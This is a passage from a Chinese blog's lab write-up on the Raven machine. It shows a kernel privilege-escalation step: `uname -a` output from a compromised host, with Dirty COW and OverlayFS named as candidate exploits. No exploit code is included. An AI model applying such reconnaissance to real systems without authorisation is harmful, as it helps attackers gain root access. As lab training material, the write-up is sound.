<h2 id="方法二：内核提权"><a href="#方法二：内核提权" class="headerlink" title="方法二：内核提权"></a>方法二：内核提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a			<span class="comment"># 查看内核，可以尝试使用dirtycow提权</span></span><br><span class="line">michael@Raven:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux Raven 3.16.0-6-amd64 <span class="comment">#1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p><code>Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</code>，这个内核版本存在<strong>多个高危漏洞</strong></p>
<p>Dirty COW 提权（CVE-2016-5195）</p>
<p>OverlayFS 提权（CVE-2015-8660）</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wickt42</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/08/13/php数组练习与渗透测试初识/">http://example.com/2025/08/13/php数组练习与渗透测试初识/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2025/08/12/php%E5%88%9D%E8%AF%86/"><span>php初识</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2025 By wickt42</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>